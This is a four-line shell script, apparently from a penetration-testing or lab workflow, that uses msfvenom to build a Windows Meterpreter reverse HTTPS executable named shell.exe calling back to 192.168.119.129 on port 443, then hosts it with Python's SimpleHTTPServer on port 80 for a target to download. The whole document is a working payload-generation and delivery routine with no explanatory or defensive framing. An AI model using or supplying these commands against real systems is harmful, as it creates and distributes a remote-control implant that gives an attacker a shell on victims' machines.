msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.129 LPORT=443 -f exe -o shell.exe
echo '[*] Serving up shell.exe at http://192.168.119.129/shell.exe'
echo '[*] Ctrl + c to kill'
python -m SimpleHTTPServer 80
